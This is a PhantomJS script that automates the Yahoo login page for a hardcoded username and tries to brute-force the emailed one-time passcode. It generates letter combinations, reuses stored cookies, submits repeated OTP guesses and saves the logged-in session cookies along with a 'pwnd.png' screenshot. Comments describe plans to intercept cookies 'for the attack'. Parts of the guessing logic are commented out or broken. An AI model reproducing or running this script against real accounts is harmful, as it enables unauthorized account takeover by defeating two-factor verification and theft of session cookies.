var page = new WebPage(),
	fs = require('fs'),
	system = require('system'),
	args = system.args,
	CookieJar = "cookiejar.json",
	loggedInCookieJar = "cookiejarLogged.json",
	username = 'branceboren',
	code = 'EVYB',
	pageResponses = {},
	alphabet = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'],
	perms = [],
	testindex = 0,
	loadInProgress = false,
	stepTime = 10000, // 10 seconds is kinda ridiculous but it's safe
	firstTime = false; // set accordingly. NOTE: if it's the first time, it will fail and you will have to manually enter the 8 character code sent to you for now.  In the future there will be a way to intercept the cookie a nd use it for the attack.  The second time through (after you've successfully logged in with the 8 character code (check screenshots)) set this to true.

for(var i = 0; i<alphabet.length; i++){
	for(var j = 0; j < alphabet.length; j++){
		var combo = alphabet[i]+alphabet[j];
		perms.push(combo);
	}
}

if(firstTime){
	page.onResourceReceived = function(response) {
		pageResponses[response.url] = response.status;
		fs.write(CookieJar, JSON.stringify(phantom.cookies), "w");
	};
} // else optional page.onResourceReceived handler here

page.onResourceRequested = function(requestData, networkRequest){
	if(requestData.url == 'https://www.yahoo.com/'){
		console.log('Successfully logged in!!!!');
		window.setTimeout(function(){
			page.render('pwnd.png');
			fs.writeSync(loggedInCookieJar, JSON.stringify(phantom.cookies), "w");
			phantom.exit();
		}, 10000);
		console.log('We\'re FREE!!!!');
	}
}

if(fs.isFile(CookieJar)){
	Array.prototype.forEach.call(JSON.parse(fs.read(CookieJar)), function(x){
		phantom.addCookie(x);
	});
}
 
page.onConsoleMessage = function(msg) {
	console.log(msg);
};
 
page.onLoadStarted = function() {
	loadInProgress = true;
	console.log("load started");
};
 
page.onLoadFinished = function() {
	loadInProgress = false;
	console.log("load finished");
};

page.onUrlChanged = function(targetUrl){
	console.log('New URL: '+targetUrl);
}

var loadPage = function() {
	console.log("Load Login Page");
	page.settings.userAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.6 Safari/537.11";
	page.open("https://login.yahoo.com/");
};

var enterCredentials = function(){
	console.log("Enter Credentials");
	page.injectJs("jquery-latest.min.js");
	page.evaluate(function(username) {
		$('#login-username').val(username);
		// $('#persistent').removeAttr('checked');
		$('#login-signin').click();
		window.setTimeout(function(){
			$('#login-signin').click();
		},1000);
		console.log(document.title);
	}, username);
};

var tryLoggingIn = function(){
	console.log('try logging in (expected to fail)');
	page.injectJs("jquery-latest.min.js");
	page.evaluate(function() {
		console.log(document.title);
		$('#mbr-login-form').submit();
	});
};

var sendTheCode = function(){
	console.log('send me the code');
	page.injectJs("jquery-latest.min.js");
	page.evaluate(function(){
		console.log(document.title);
		$('#login-signin').click();
	});
};

var enterTheCode = function(){
	console.log('Enter the code');
	page.injectJs("jquery-latest.min.js");
	page.evaluate(function(code){
		console.log(document.title);
		$('#login-otp-passwd ').val(code);
		$('#login-otp-signin').click();
	}, code);	
};
var bruteforce = function(){
	console.log('Starting bruteforce...');
	page.injectJs("jquery-latest.min.js");
	page.evaluate(function(args, perms){
		var argIndex = 1;
		var permIndex = 0;
		var storedAttempt = $('[name="_seqid"]').first().attr('value');
		var count = 0;
		attack();
		timer = setInterval(function(){
			var sequenceId = $('[name="_seqid"]');
			if(null !== sequenceId){
				var checkAttempt = $('[name="_seqid"]').first().attr('value');
				if(storedAttempt != checkAttempt){
					storedAttempt = checkAttempt;
					attack();
				}
			}
		}, 1);
		
		function attack(){
			var passInput = $('#login-otp-passwd');
			// var passGen = getNextCombo();
			if(count < 50){
				passInput.val('AAAA');
			} else{
				passInput.val(args[1].toString());
			}
			count++;
			console.log('Bruteforce attempt: '+count);
			$('#login-otp-signin').click();
		}
		
		function getNextCombo(){
			var a = argIndex;
			var p = permIndex;
			if(p < perms.length){
				permIndex++;
			} else{
				argIndex++;
				permIndex = 0;
			}
			if(a < args.length){
				return args[a]+perms[p];
			} else {
				window.setTimeout(function(){
					console.log('FAILURE!!! NOOB');
					page.render('failed.png');
					phantom.exit();
				}, 10000);
			}
		}
	}, args, perms);
}


var steps = [
	loadPage,
	enterCredentials,
	tryLoggingIn,
	sendTheCode,
	// enterTheCode
	bruteforce
];

if(!firstTime){
	// take out the steps that are required for the 8 character code 
	// but will break the 4 character code
	steps.splice(2,2);
}
 
interval = setInterval(function() {
	if (!loadInProgress && typeof steps[testindex] == "function") {
		console.log("step " + (testindex + 1));
		steps[testindex]();
		page.render("step" + (testindex + 1) + ".png");
		console.log('wrote step ' + (testindex +1) + ' to file')
		testindex++;
	}
	if (typeof steps[testindex] != "function") {
		// console.log(testindex + ' is not a function???');
		console.log("test complete!");
		window.setTimeout(function(){
			page.render('progress.png');
		}, 10000);
	}
}, stepTime);